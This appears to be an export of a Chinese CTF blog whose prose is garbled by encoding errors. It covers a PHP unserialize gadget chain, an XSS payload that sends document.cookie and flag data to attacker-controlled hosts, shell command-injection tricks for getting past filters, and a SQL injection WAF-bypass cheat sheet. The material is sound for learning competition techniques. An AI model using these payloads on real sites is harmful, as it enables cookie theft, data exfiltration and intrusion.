<span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Giveme = (<span class="variable language_">$this</span>-&gt;action)();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Giveme;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;count = <span class="string">&quot;one&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;try &quot;</span>.<span class="variable language_">$this</span>-&gt;count.<span class="string">&quot; again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*\/\/.*/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\..\..*/&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;game&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$one</span> = <span class="keyword">new</span> <span class="title class_">One</span>();</span><br><span class="line"><span class="variable">$abaaba</span> = <span class="keyword">new</span> <span class="title function_ invoke__">abaaba</span>();</span><br><span class="line"><span class="variable">$one</span>-&gt;count = <span class="variable">$abaaba</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$one</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="xssç›²æ‰“å’Œæœ¬åœ°è¯·æ±‚ä¼ªé€ "><a href="#xssç›²æ‰“å’Œæœ¬åœ°è¯·æ±‚ä¼ªé€ " class="headerlink" title="xssç›²æ‰“å’Œæœ¬åœ°è¯·æ±‚ä¼ªé€ "></a>xssç›²æ‰“å’Œæœ¬åœ°è¯·æ±‚ä¼ªé€ </h3><p>è¿™é“é¢˜ç›®å…¶å®æŒºç®€å•çš„å…ˆxssæ‰“cookie,æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯å¦‚ä¸‹payload(è¿™ä¸ªä¸å”¯ä¸€)ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://xxxx.xxx.com/cookie.php?c=&quot;</span>%2bdocument.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æç¤ºï¼šGET &#x2F;a?cookie&#x3D;hint&#x3D;Visit%20&#x2F;g3t_fl4g%20to%20get%20flag HTTP&#x2F;1.1</p>
<p>æˆ‘ä»¬ç›´æ¥è®¿é—®&#x2F;g3t_fl4gæç¤ºæœ¬åœ°è®¿é—®ï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬çš„è¿™ä¸ªä¼ªé€ æœ¬åœ°headerä¸­åªæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X-Originating-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-IP</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">X-Remote-Addr</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Client-IP</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œéƒ½ä¸è¡Œï¼Œå†ç»“åˆxsså¯ä»¥æƒ³åˆ°æ˜¯åˆ©ç”¨xssä¼ªé€ ç®¡ç†å‘˜æœ¬åœ°å‘ä¸€ä¸ªè¯·æ±‚ï¼Œå†æŠŠå“åº”æºå¸¦å‡ºæ¥ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°ç”¨AJAXã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œå¯¹XMLHttpRequestæœ‰è¿‡æ»¤ï¼Œæˆ‘ä»¬åªéœ€è¦ç®€å•çš„é¥¶è¿‡ä¸€ä¸‹å³å¯ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> ajx = <span class="built_in">eval</span>(<span class="string">&quot;new XMLH&quot;</span>+<span class="string">&quot;ttpR&quot;</span>+<span class="string">&quot;equest&quot;</span>);<span class="comment">//æ‹¼æ¥ç»•è¿‡ã€‚</span></span><br><span class="line">    ajx.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;/g3t_fl4g&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    ajx.<span class="title function_">send</span>();</span><br><span class="line">    ajx.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(ajx.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(ajx.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">                ajx.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://VPS:5555/?flag=&quot;</span> + ajx.<span class="property">responseText</span>,<span class="literal">true</span>);</span><br><span class="line">                ajx.<span class="title function_">send</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„vpsä¸Šé¢å°±ä¼šæ”¶åˆ°flagäº†ã€‚</p>
<h2 id="ç»“æŸè¯­"><a href="#ç»“æŸè¯­" class="headerlink" title="ç»“æŸè¯­"></a>ç»“æŸè¯­</h2><p>webç‹—çœŸæ˜¯æ²¡å•¥å‡ºè·¯ï¼Œå·ä¸åŠ¨CTFäº†ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œä¸“é¢˜</title>
    <url>//posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<p>å‰æ®µæ—¶é—´ç»™ä¸€äº›çš„å­¦ç”Ÿè®²è§£å‘½ä»¤æ‰§è¡Œçš„trickï¼Œæ‰€ä»¥ä»Šå¤©å°±æ€»ç»“äº†æ‰€è®²çš„çŸ¥è¯†ç‚¹ï¼Œåˆ†äº«å‡ºæ¥ç»™å¤§å®¶å­¦ä¹ ã€‚è¿™é‡Œåªæ˜¯æŠŠç½‘ä¸Šçš„èµ„æºæ•´åˆåœ¨äº†ä¸€èµ·ï¼ŒåŠ ä¸€äº›è‡ªå·±åœ¨ctfæ¯”èµ›ä¸­çš„trickï¼Œæœ¬æ–‡ç« é€‚åˆæ‰“CTFçš„åˆå­¦è€…ã€‚</p>
<span id="more"></span>  

<p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥çœ‹é¢˜ç›®ï¼š  </p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>å…¶å®å¾ˆå¤šCTFå·²ç»è€ƒè¿‡è¿™ä¸ªè€ƒç‚¹äº†ä¹Ÿæœ‰å¤§ä½¬å‘è¿‡æ–‡ç« ï¼Œè¿™é‡Œç®€å•è¯´ä¸€ä¸‹ï¼š<br>æˆ‘ä»¬åˆ©ç”¨ &gt;a è¿™ç§æ–¹å¼å¯ä»¥åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€äº›ç±»ä¼¼ &gt;cat &gt;curlè¿™æ ·çš„æ–‡ä»¶ã€‚ç„¶åé€šè¿‡* æ‰§è¡Œ æˆ–è€… ls&gt;aè¿™æ ·æŠŠæ–‡ä»¶åå†™å…¥åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­é€šè¿‡sh a æ¥æ‰§è¡Œã€‚<br>å¦å¤–æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ \ è¿™ç§ç»­è¡Œç¬¦å·æ¥æ‹¼æ¥å‘½ä»¤ä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨æœ‰é•¿åº¦é™åˆ¶çš„å‘½ä»¤æ‰§è¡Œä¸­æ‰§è¡Œæˆ‘ä»¬æƒ³æ‰§è¡Œçš„å‘½ä»¤<br>ä¸€å›¾èƒœåƒè¨€ï¼š<br><img data-src="/images/pages/1565322181162.png" alt="1565322181162"><br>è¿™é‡Œéœ€è¦æ³¨æ„ä¸¤ç‚¹<br>1ï¼šæ–‡ä»¶åçš„é¡ºåºï¼ˆè¿™é‡Œå°±éœ€è¦ç»éªŒå’Œå°è¯•äº† å¦å¤–è¿˜æœ‰ä¸€ä¸ªé€†åºrevå’Œä¸€äº›headç­‰å–ä½ç½®çš„æŠ€å·§ï¼‰<br>2ï¼šå‘½ä»¤æ‹¼æ¥åä¿è¯å‘½ä»¤çš„é¡ºåˆ©æ‰§è¡Œ</p>
<p>ä»£ç å¦‚ä¸‹<br><img data-src="/images/pages/1565322190196.png" alt="1565322190196"><br>å››ä¸ªé•¿åº¦è¯»å–flagï¼Œå…¶å®å¾ˆç®€å•ï¼Œå››ä¸ªé•¿åº¦éƒ½èƒ½getshelläº†<br>é¦–å…ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªcat : &gt;cat åˆšå¥½å››ä¸ªå­—èŠ‚<br>ç„¶åï¼š*&gt;a æŠŠcat å‘½ä»¤æ‰§è¡Œå®Œæ¯•åçš„ç»“æœå†™å…¥a<br>æœ€åï¼šæˆ‘ä»¬è®¿é—®aæ–‡ä»¶å¯å¾—åˆ°flag<br><img data-src="/images/pages/1565322199312.png" alt="1565322199312"><br>å¦å¤–åˆ©ç”¨curlé€šè¿‡ &#x2F;&#x2F;å‘½ä»¤æ‹¼æ¥çš„å½¢å¼å¯ä»¥ç›´æ¥getshellæˆ–è€…ä¸‹è½½è¯»å–flagæ–‡ä»¶<br>æ›´è¯¦ç»†çš„æ“ä½œå‚è€ƒï¼š<a href="http://www.freebuf.com/articles/web/154453.html%EF%BC%88%E6%96%87%E7%AB%A0%E5%86%99%E7%9A%84%E8%BF%98%E6%98%AF%E5%BE%88%E5%A5%BD%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E5%BF%85%E9%A1%BB%E9%9C%80%E8%A6%81%E7%9B%AE%E5%BD%95%E6%9C%89%E5%8F%AF%E5%86%99%E6%9D%83%E9%99%90%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%98%E6%98%AF%E6%AF%94%E8%BE%83%E9%B8%A1%E8%82%8B%E7%9A%84%EF%BC%8C%E5%8F%AA%E8%83%BD%E8%AF%B4%E6%98%AFCTF%E7%9A%84%E4%B8%80%E4%B8%AAtrick%E5%90%A7%EF%BC%89">http://www.freebuf.com/articles/web/154453.htmlï¼ˆæ–‡ç« å†™çš„è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œä½†æ˜¯è¿™ä¸ªå¿…é¡»éœ€è¦ç›®å½•æœ‰å¯å†™æƒé™ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒé¸¡è‚‹çš„ï¼Œåªèƒ½è¯´æ˜¯CTFçš„ä¸€ä¸ªtrickå§ï¼‰</a></p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h2><p>æºç å¦‚ä¸‹ï¼š<br><img data-src="/images/pages/1565322300227.png" alt="1565322300227"><br>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šå­—èŠ‚ï¼Œä½†æ˜¯linuxå¯ä»¥åˆ©ç”¨å˜é‡æ‹¼æ¥å‘½ä»¤ï¼Œæ¯”å¦‚ï¼š<br><img data-src="/images/pages/1565322306869.png" alt="1565322306869"><br>è¿™æ˜¯ç¬¬ä¸€ä¸ªæŠ€å·§</p>
<p>ç¬¬äºŒä¸ªå°±æ˜¯åœ¨linuxä¸­ ${IFS} å¯ä»¥æ›¿ä»£ç©ºæ ¼ è¿˜æœ‰ä¸€ä¸ªæ˜¯ca$(éšä¾¿è¾“å…¥å­—ç¬¦)tå¯ä»¥ç»•å¼€cat è¿‡æ»¤<br><img data-src="/images/pages/1565322313852.png" alt="1565322313852"><br>æ‰€ä»¥payloadçš„æœ‰ä¸¤ç§ï¼š1ã€å˜é‡æ‹¼æ¥ç»•è¿‡è¿‡æ»¤<br>â€‹                                     2ã€$(éšä¾¿è¾“å…¥å­—ç¬¦) ç»•è¿‡è¿‡æ»¤ </p>
<p>å…·ä½“payloadå°±ä¸ç»™å‡ºäº†,è¿™ä¸ªå¾ˆç®€å•ï¼è¿˜æœ‰å°±æ˜¯è¿™ç§è¿‡æ»¤æ˜¯å¯ä»¥è¢«åå¼¹shellçš„ï¼Œå› ä¸ºæš‚æ—¶è¿˜æœ‰ä¸€ä¸ªæˆ‘å‡ºçš„é¢˜ç›®ç”¨åˆ°äº†è¿™ä¸ªgetshellï¼Œæ‰€ä»¥æš‚æ—¶å…ˆä¸æ”¾äº†ï¼Œç­‰è¿‡å‡ å¤©åœ¨è¡¥å……ï¼</p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h2><p>è¿™ä¸ªæ˜¯ä»¥å‰çš„ä¸€é“CTFé¢˜ï¼Œé¢˜ç›®æ˜¯è®©é€‰æ‰‹ç»•è¿‡æ­£åˆ™ï¼Œè¯»å–flagæ–‡ä»¶ï¼Œå…¶å®è¿™é‡Œä¸»è¦å°±æ˜¯ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼š</p>
<p>1ã€åœ¨shellç¯å¢ƒä¸­å¤šä¸ªå‘½ä»¤çš„åˆ†éš”ç¬¦é™¤äº† ; ä¹‹å¤–è¿˜æœ‰æ¢è¡Œç¬¦ </p>
<p>2ã€æ­£åˆ™è¡¨è¾¾å¼ç»“å°¾çš„&#x2F;m ï¼Œåœ¨phpä¸­ï¼Œ&#x2F;mè¡¨ç¤ºå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ï¼Œå¼€å¯å¤šè¡ŒåŒ¹é…æ¨¡å¼ä¹‹å^å’Œ$çš„å«ä¹‰å°±å‘ç”Ÿäº†å˜åŒ–ï¼Œæ²¡å¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹å‰(å³å•è¡ŒåŒ¹é…æ¨¡å¼), ^ å’Œ$ æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹å’Œç»“å°¾ï¼Œå¼€å¯å¤šè¡Œæ¨¡å¼ä¹‹åï¼Œå¤šè¡Œæ¨¡å¼^,$å¯ä»¥åŒ¹é…è¡Œçš„å¼€å¤´å’Œå°¾è¡Œç»“å°¾</p>
<p>å…ˆçœ‹æºç :<br><img data-src="/images/pages/1565322457133.png" alt="1565322457133"><br>cat ä¸€ä¸ªç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶ åç¼€å¿…é¡»æ˜¯txtçš„ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡éšæ„è¾“å…¥ä¸€ä¸ª .txtæ–‡ä»¶ç”¨%0aæ¢è¡Œç„¶åæ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤</p>
<p>Payloadï¼špath&#x3D;ls.txt%0als%20|%20head%20-n2 ï¼ˆæŸ¥çœ‹æ–‡ä»¶åï¼‰<br>Payloadï¼špath&#x3D;flag.txt%0Acat%<a href="mailto:&#x32;&#x30;&#102;&#x31;&#x40;&#x67;&#46;&#112;&#104;&#x70;">&#x32;&#x30;&#102;&#x31;&#x40;&#x67;&#46;&#112;&#104;&#x70;</a>%0A.txt ï¼ˆè¯»å–flagå€¼ï¼‰</p>
<p>ä¸œè¥¿éƒ½å¾ˆç®€å•ï¼Œdockeræ–‡ä»¶æ”¾åœ¨githubä¸Šäº†å¤§å®¶æ²¡äº‹å¯ä»¥ç©å„¿ä¸€ä¸‹</p>
<p>é“¾æ¥ï¼š<a href="https://github.com/geeeez/ctf-shelli">https://github.com/geeeez/ctf-shelli</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>command excution</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFä¸­çš„sqlæ³¨å…¥æ€»ç»“</title>
    <url>//posts/CTF%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>éå¸¸ä¸æƒ³å†™è¿™ç¯‡åšå®¢ï¼Œå› ä¸ºctfä¸­çš„sqlæ³¨å…¥æŠ€å·§å¤ªä¹±äº†ï¼Œä¸çŸ¥é“æ€ä¹ˆæ’ç‰ˆæ€ä¹ˆåˆ†å—æŠŠä»–è¡¨è¿°æ¸…æ¥šï¼Œç„¶ååˆèƒ½åƒä¸€ä¸ªç¬”è®°ä¸€æ ·æ—¶æ—¶ä¾›æˆ‘æŸ¥é˜…ã€‚æ‰€ä»¥ç›´åˆ°æˆ‘æ‰“ç°åœ¨è¿™å‡ ä¸ªå­—çš„æ—¶å€™æˆ‘éƒ½åœ¨æƒ³å’‹æŠŠæˆ‘é‚£å˜ˆæ‚çš„ç¬”è®°æ•´ç†å‡ºè¿™ç¯‡æ–‡ç« ã€‚ä½†æ˜¯æ•´ç†è‚¯å®šè¿˜æ˜¯è¦æ•´ç†çš„ï¼Œæ¯•ç«Ÿè‡ªå·±ä¹Ÿè¦çœ‹ã€‚<span id="more"></span></p>
<h4 id="CTF-sqlæ³¨å…¥ä¸‰åŸåˆ™"><a href="#CTF-sqlæ³¨å…¥ä¸‰åŸåˆ™" class="headerlink" title="CTF sqlæ³¨å…¥ä¸‰åŸåˆ™"></a>CTF sqlæ³¨å…¥ä¸‰åŸåˆ™</h4><p>1.ç»†è‡´çš„çŒœæµ‹æ³¨å…¥ç‚¹çš„è¯­å¥å¤§æ¦‚æ˜¯ä»€ä¹ˆæ ·å­ã€‚<br>2.åˆ¤æ–­æ˜¯æœ‰å›æ˜¾çš„æ³¨å…¥è¿˜æ˜¯ç›²æ³¨ï¼Œæœ‰å›æ˜¾çš„æ³¨å…¥å½“ç›²æ³¨åšæ˜¯è‡ªå·±ä¸ºéš¾è‡ªå·±ã€‚<br>3.ç›²æ³¨ä¼˜å…ˆè€ƒè™‘å¸ƒå°”ç›²æ³¨ï¼Œç„¶åæ‰æ˜¯æ—¶é—´ç›²æ³¨ã€‚</p>
<h4 id="sqlæ³¨å…¥æµç¨‹"><a href="#sqlæ³¨å…¥æµç¨‹" class="headerlink" title="sqlæ³¨å…¥æµç¨‹"></a>sqlæ³¨å…¥æµç¨‹</h4><p>æˆ‘ä»¬æ¥æ‹ä¸€æ‹è¿™ä¸ªsqlæ³¨å…¥çš„ä¸€èˆ¬æµç¨‹ï¼Œé¦–å…ˆæœ‰ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œç„¶åè‚¯å®šæœ‰ä¸€ä¸ªwafï¼Œwafè¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œæˆ‘ä»¬åšçš„å°±æ˜¯ç»•è¿‡å…³é”®å­—çš„è¿‡æ»¤ï¼Œæ„é€ èƒ½æ‰§è¡Œçš„sqlè¯­å¥å»è·å–æ•°æ®åº“çš„flagã€‚æ‹å®Œæµç¨‹ï¼Œæˆ‘ä»¬å°±çŸ¥é“æµç¨‹ä¸­æ¯ä¸€æ­¥åº”è¯¥æ€ä¹ˆåšã€åº”è¯¥åšä»€ä¹ˆã€‚åœ¨å¼€å§‹ä¹‹å‰è¿˜æ˜¯è¦æå‡ºå‡ ä¸ªæ³¨æ„ç‚¹ï¼š<br>1.æ³¨æ„åŒºåˆ†æ•°æ®çš„å¤§å°å†™ï¼Œå› ä¸ºmysqlé»˜è®¤ä¸åŒºåˆ†æ•°æ®çš„å¤§å°å†™æ¯”è¾ƒ<br>è§£å†³æ–¹æ³•ï¼šasciiç¼–ç æ¯”è¾ƒã€WHEREååŠ BINARYã€regexp<br>2.ç«™åœ¨å‡ºé¢˜è€…è§’åº¦æ€è€ƒé—®é¢˜ã€‚</p>
<h4 id="å¼€å§‹æ³¨å…¥"><a href="#å¼€å§‹æ³¨å…¥" class="headerlink" title="å¼€å§‹æ³¨å…¥"></a>å¼€å§‹æ³¨å…¥</h4><h5 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h5><p>è‡ªåŠ¨åŒ–fuzzæˆ–è€…æ‰‹å·¥fuzzï¼Œå¦‚æœä¸ban ip ã€ç½‘ç»œç¨³å®šï¼Œé‚£ä¹ˆè‡ªåŠ¨åŒ–fuzzè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ã€‚å› ä¸ºç»å¤§å¤šæ•°éƒ½æ˜¯å…³é”®å­—è¿‡æ»¤ï¼Œfuzzçš„å‡†ç¡®åº¦å¾ˆé«˜ã€‚è„šæœ¬å°±æ˜¯ç›´æ¥pyè¯·æ±‚æŸ¥çœ‹å“åº”æ˜¯å¦æœ‰wafå“åº”çš„å…³é”®å­—ã€‚<br>fuzzå­—å…¸ï¼ˆä¸å…¨ï¼Œè‡ªè¡Œè¡¥å……ï¼‰</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">|</span><br><span class="line">%</span><br><span class="line">and</span><br><span class="line">%26</span><br><span class="line">&amp;</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">information</span><br><span class="line">information_schema</span><br><span class="line">name</span><br><span class="line">table_name</span><br><span class="line">column_name</span><br><span class="line">if</span><br><span class="line">,</span><br><span class="line">%20</span><br><span class="line"> //ç©ºæ ¼</span><br><span class="line">sleep</span><br><span class="line">^</span><br><span class="line">in</span><br><span class="line">like</span><br><span class="line">between</span><br><span class="line">*</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">-</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">@</span><br><span class="line">user</span><br><span class="line">password</span><br><span class="line">passwd</span><br><span class="line">username</span><br></pre></td></tr></table></figure>

<h5 id="ç»•è¿‡waf"><a href="#ç»•è¿‡waf" class="headerlink" title="ç»•è¿‡waf"></a>ç»•è¿‡waf</h5><p>ç»•è¿‡wafè¯´ç™½äº†å°±æ˜¯åŒåŠŸèƒ½å‡½æ•°çš„æ›¿æ¢ï¼Œæ¯”å¦‚ substr &#x3D;&#x3D; midï¼Œä¸‹é¢æˆ‘ä»¬å°±æä¸ªè¿™æ ·çš„è¡¨æ–¹ä¾¿å¤§å®¶æŸ¥è¯¢(ä»–ä»¬åœ¨ä¸€å®šæˆéƒ½ä¸Šéƒ½æœ‰æ›¿ä»£ä½œç”¨)ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ¯”è¾ƒåˆ¤æ–­</span><br><span class="line">&gt;  &lt;  &lt;&gt;  = and or || &amp;&amp; %26%26 like  between  regexp  in  strcmp  locate(s1,s)  position(s1 in s)  instr(s,s1)  greatest()  find_in_set() </span><br><span class="line">//psï¼šselect &quot;123&quot; in (&quot;123&quot;); =&gt; 1 select &quot;123&quot; in (&quot;12&quot;)</span><br><span class="line"></span><br><span class="line">//ascii</span><br><span class="line">hex()</span><br><span class="line">bin()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">//åˆ‡å‰²å­—ç¬¦ä¸²</span><br><span class="line">left()</span><br><span class="line">right()</span><br><span class="line">mid()</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line">lpad()</span><br><span class="line">rpad()</span><br><span class="line">//ps:LPAD(&#x27;abcdef&#x27;,4,&#x27;?&#x27;); å’ŒRPAD(&#x27;abcdef&#x27;,4,&#x27;?&#x27;);ç»“æœéƒ½ä¸ºabcd</span><br><span class="line"></span><br><span class="line">//ç©ºæ ¼</span><br><span class="line">%20 + /**/ /*ä¹±å­—ç¬¦*/ </span><br><span class="line">1e1 1.1 () </span><br><span class="line">//è¿™é‡Œçš„æ‹¬å·ç»•è¿‡æ˜¯æœ‰é™åˆ¶çš„ä¸æ˜¯ç›´æ¥æ‹¬å·å½“ç©ºæ ¼ç”¨ï¼Œè¿˜æ˜¯ä¸¾ä¸ªä¾‹å­æŠŠï¼š</span><br><span class="line">select(id)from(user);  æ‹¬å·å†…ä¸èƒ½æ˜¯*ã€‚</span><br><span class="line">PS:æµ®ç‚¹æ•°ç§‘å­¦è®¡æ•°æ³•åé¢çš„å­—ç¬¦ä¸²ä¹Ÿä¸éœ€è¦ç©ºæ ¼ æ¯”å¦‚ï¼šselect 1.1and(1)</span><br><span class="line"></span><br><span class="line">//è¿‡æ»¤é€—å·</span><br><span class="line">imit 0,1 =&gt; limit 1 offset 0;</span><br><span class="line">mid(str,5,1) =&gt;mid(&#x27;str&#x27;from 5 for 1) =&gt;substr(&#x27;str&#x27; from for 1)</span><br><span class="line">union select 1,2,3 =&gt; union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">mid(&#x27;123&#x27; from -1); =&gt;3 //é€‚ç”¨äºforè¢«è¿‡æ»¤</span><br><span class="line">mid(&#x27;123&#x27; from -2); =&gt;23 //é€‚ç”¨äºforè¢«è¿‡æ»¤</span><br><span class="line">substring(&#x27;abc&#x27; from 1) = abc  </span><br><span class="line">substring(&#x27;abc&#x27; from 2) = bc</span><br><span class="line">è¿™æ ·æˆ‘ä»¬é€šè¿‡ord ascii å‡½æ•°å³å¯è¿›è¡Œåˆ¤æ–­ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°è¿”å›ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç </span><br><span class="line"></span><br><span class="line">//è¿æ¥å­—ç¬¦ä¸²çš„å‡½æ•°</span><br><span class="line">concat(str1,str2) å°†å­—ç¬¦ä¸²é¦–å°¾ç›¸è¿</span><br><span class="line">concat_ws(separator,str1,str2) å°†å­—ç¬¦ä¸²ç”¨æŒ‡å®šè¿æ¥ç¬¦è¿æ¥</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">//æ³¨é‡Š</span><br><span class="line">#</span><br><span class="line">/**/</span><br><span class="line">--</span><br><span class="line">;%00 //mysqlæ˜¯Cå†™çš„ä¹Ÿå­˜åœ¨00æˆªæ–­</span><br><span class="line"></span><br><span class="line">//å»¶æ—¶å‡½æ•°</span><br><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br><span class="line"></span><br><span class="line">//hexç¼–ç çš„ç”¨å¤„</span><br><span class="line">æ‰€æœ‰ç”¨æˆ·è¾“å…¥çš„ä¼šæ‹¼æ¥åˆ°=å·åé¢çš„æ•°æ®éƒ½å¯ç”¨hexç¼–ç æ¯”å¦‚ï¼š</span><br><span class="line">select * from user where username=0x7cb6e453</span><br><span class="line">è¿™æ ·çš„å¥½å¤„å°±æ˜¯ï¼Œæ¯”å¦‚ä¸éœ€è¦å•å¼•å· ç»•è¿‡å…³é”®å­—è¿‡æ»¤ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">//ç»•è¿‡ä¸€ä½“åŒ–è¿‡æ»¤ æ¯”å¦‚ 